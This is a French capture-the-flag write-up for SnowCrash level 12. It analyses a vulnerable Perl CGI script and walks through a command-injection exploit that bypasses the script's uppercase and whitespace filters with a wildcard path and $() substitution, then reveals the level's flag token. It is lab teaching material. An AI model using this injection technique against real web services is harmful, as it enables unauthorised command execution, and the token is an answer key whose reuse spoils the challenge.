# LEVEL 12

### Reconnaissance

On tombe sur un fichier perl
```
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Meme chose que le level04, un script perl qui est en ecoute sur le port 4646.
Ce script attend 2 paramètres : x et y
le paramètre y ne nous sert a rien, seul x va nous servir.


Cette ligne nous permet une injection de commande :
```
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
```
les backsticks interprette le code, la difficulté de ce level est de contourné les 2 regex avant:

```
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
```

Le premier converti les lettres en majuscule.
Le second supprime les espaces.

### Exploitation

```
level12@SnowCrash:~$ echo "getflag > /tmp/flag" > /tmp/PAYLOAD && chmod +x /tmp/PAYLOAD
```

On creer un fichier /tmp/PAYLOAD qu'on rend exécutable. Il ne nous reste plus qu'a faire notre injection:

```
192.168.56.105:4646/?x='$(/*/payload)'
OU
192.168.56.105:4646/?x='$(/*/PAYLOAD)'
```

le wilcard nous permet de contourné le filtre qui mettrait en majuscule /tmp
On a créer notre fichier en majuscule, le regex va nous le convertir tous seul.
$() nous permet d'executé la commande.

```
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```


